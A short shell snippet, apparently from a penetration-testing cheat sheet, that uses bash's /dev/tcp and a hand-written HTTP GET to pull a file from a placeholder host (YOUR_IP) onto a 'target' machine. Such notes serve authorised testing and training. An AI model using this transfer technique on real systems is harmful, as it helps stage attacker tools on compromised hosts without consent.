```sh
# On target, download using bash:
exec 3<>/dev/tcp/YOUR_IP/8000
echo -e "GET /file.txt HTTP/1.1\r\nHost: YOUR_IP\r\nConnection: close\r\n\r\n" >&3
cat <&3 > file.txt
```